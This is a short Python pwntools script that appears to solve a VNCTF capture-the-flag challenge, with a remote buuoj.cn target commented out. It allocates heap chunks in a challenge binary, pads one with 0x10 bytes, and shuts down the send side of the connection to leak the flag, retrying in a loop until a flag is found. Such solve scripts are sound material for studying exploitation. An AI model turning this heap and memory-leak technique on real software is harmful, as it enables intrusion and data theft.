from pwn import *

# context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('elf')
# io = remote('node4.buuoj.cn', 39123)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('elf')
flag = b''

def add(size):
    io.sendafter('choice:', 'a')
    io.sendlineafter('size:\n', str(size))


def edit(index, content):
    io.sendafter('choice:', 'aaaa')
    io.sendlineafter('index:\n', str(index))
    io.sendafter('Content:\n', content)


def pwn():
    add(0x18)
    add(0x18)
    add(0x18)
    add(0x310)
    edit(3, b'a' * 0x10)
    io.recvuntil('choice:')
    io.shutdown_raw('send')
    io.recvuntil(b'a' * 0x10)
    flag = io.recvline()
    log.success(flag.decode())
    if b'vnctf{' in flag or b'}' in flag:
        return
    else:
        raise EOFError


if __name__ == '__main__':
    while True:
        try:
            pwn()
        except:
            io.close()
            io = process('elf')
            # io = remote('node4.buuoj.cn', 39123)
            continue
        else:
            break
    log.success(flag.decode())
